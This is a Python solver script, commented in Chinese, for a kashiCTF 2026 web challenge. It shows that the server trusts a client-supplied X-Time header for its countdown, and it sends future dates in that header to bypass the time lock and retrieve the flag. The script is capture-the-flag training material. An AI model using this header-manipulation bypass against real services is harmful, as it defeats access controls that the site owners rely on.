"""
kashiCTF 2026 - You may have the Flag
Web 类题目自动化解题脚本

漏洞原理：
    服务器从 HTTP 请求的 X-Time Header 读取时间值，替代 Date.now() 计算倒计时。
    通过发送一个未来日期的 X-Time Header，可以绕过计时器锁定，直接获取 Flag。

使用方法：
    python kashiCTF_You_may_have_the_Flag.py <target_url>
    例如: python kashiCTF_You_may_have_the_Flag.py http://34.126.223.46:19287

解题思路：
    1. 先发送正常请求，确认页面被计时器锁定
    2. 发送带有非法 X-Time 值的请求，检测是否出现 NaN（确认漏洞存在）
    3. 发送未来日期的 X-Time Header，绕过计时器获取 Flag
"""

import sys
import requests


def solve(target_url: str) -> None:
    """
    自动化检测 X-Time Header 时间绕过漏洞并获取 Flag。

    Args:
        target_url: 题目目标 URL，例如 http://34.126.223.46:19287
    """
    target_url = target_url.rstrip("/")

    # ========== 步骤 1: 正常请求，确认锁定状态 ==========
    print("[*] 步骤 1: 发送正常请求，确认计时器锁定状态")
    resp = requests.get(target_url)
    print(f"    状态码: {resp.status_code}")
    print(f"    X-Powered-By: {resp.headers.get('X-Powered-By', 'N/A')}")
    print(f"    响应内容: {resp.text.strip()}")

    if "Challenge Locked" not in resp.text:
        print("[!] 页面未显示锁定状态，可能题目已变更")
        return

    print("[+] 确认：页面被计时器锁定\n")

    # ========== 步骤 2: 发送非法 X-Time 值，检测是否产生 NaN ==========
    print("[*] 步骤 2: 注入非法 X-Time Header，检测漏洞")
    resp_nan = requests.get(target_url, headers={"X-Time": "invalid_date_string"})
    print(f"    响应内容: {resp_nan.text.strip()}")

    if "NaN" in resp_nan.text:
        print("[+] 检测到 NaN！服务器读取了 X-Time Header 并用于时间计算")
        print("[+] 漏洞确认：X-Time Header 可被客户端控制\n")
    else:
        print("[-] 未检测到 NaN，尝试继续...\n")

    # ========== 步骤 3: 发送未来日期绕过计时器 ==========
    # 题目提示 "You may have the Flag" 中的 "may" 暗示五月（May）
    # 发送一个五月的日期作为 X-Time 值，让服务器认为已经过了解锁时间
    bypass_dates = [
        "2026-05-01",                          # ISO 日期（五月，呼应题目提示）
        "2026-04-04T00:00:00Z",                # ISO 完整时间戳
        "Fri, 03 Apr 2026 23:59:59 GMT",       # HTTP 日期格式
    ]

    print("[*] 步骤 3: 发送未来日期绕过计时器")
    for date_val in bypass_dates:
        resp_bypass = requests.get(target_url, headers={"X-Time": date_val})
        body = resp_bypass.text.strip()

        if "Challenge Locked" not in body and "NaN" not in body:
            print(f"    X-Time: {date_val}")
            print(f"[+] Flag 获取成功！")
            print(f"\n{'='*50}")
            print(f"    FLAG: {body}")
            print(f"{'='*50}\n")
            return
        else:
            print(f"    X-Time: {date_val} -> {body}")

    print("[-] 所有尝试均未成功，可能需要调整日期范围")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"用法: python {sys.argv[0]} <target_url>")
        print(f"例如: python {sys.argv[0]} http://34.126.223.46:19287")
        sys.exit(1)

    solve(sys.argv[1])
